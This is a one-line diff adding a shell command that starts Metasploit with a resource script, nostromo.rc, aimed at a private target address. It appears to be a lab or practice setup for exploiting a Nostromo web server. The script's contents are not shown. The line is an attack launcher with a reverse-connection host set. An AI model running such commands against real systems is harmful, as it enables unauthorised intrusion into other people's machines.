@@ -1,0 +1,1 @@
+LHOST=`hostname -I` RHOST=192.168.199.3 msfconsole -r nostromo.rc
